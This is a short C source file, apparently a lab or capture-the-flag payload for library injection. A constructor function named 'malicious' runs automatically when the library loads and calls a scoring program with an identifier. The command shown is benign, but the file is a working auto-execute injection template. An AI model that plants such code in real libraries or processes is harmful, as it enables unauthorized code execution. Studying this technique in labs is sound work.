#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a7bcb27c-426c-4f66-af39-de6283f253e4");
}
